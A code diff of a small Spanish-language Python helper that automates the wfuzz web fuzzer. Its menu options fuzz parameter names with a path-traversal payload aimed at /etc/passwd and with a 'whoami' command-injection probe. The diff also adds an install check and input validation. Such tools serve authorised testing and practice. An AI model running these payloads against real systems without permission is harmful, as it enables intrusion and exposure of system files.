@@ -1,8 +1,17 @@
 import subprocess as sp
+import sys
 
 print("""
-[+] Herramienta WFuzz Automática
+[+] Herramienta WFuzz Automatica
 """)
+
+# Verificar que wfuzz esta instalado
+try:
+    sp.run(["wfuzz", "--version"], stdout=sp.DEVNULL, stderr=sp.DEVNULL, timeout=3)
+except FileNotFoundError:
+    print("[!] Error: wfuzz no esta instalado")
+    print("    Instala con: sudo apt install wfuzz")
+    sys.exit(1)
 
 try:
     opcion = int(input("""
@@ -14,8 +23,8 @@ Digite una opcion
 [4] Salir
 
 > """))
-except:
-    print("Error")
+except ValueError:
+    print("Error: Ingresa un numero valido")
     exit()
 
 if opcion == 1:
@@ -40,7 +49,6 @@ elif opcion == 2:
             "wfuzz",
             "-c",
             "-w", "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
-            "--hl=62",
             f"{url}?FUZZ=../../../../../../../../../../../../../etc/passwd"
         ]
         sp.run(comando)
@@ -54,7 +62,6 @@ elif opcion == 3:
         comando = [
             "wfuzz",
             "-c",
-            "--hl", "62",
             "-w", "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
             f"{url}?FUZZ=whoami"
         ]
@@ -68,5 +75,5 @@ elif opcion == 4:
     exit()
 
 else:
-    print("Opción no válida")
+    print("Opcion no valida")
     exit()
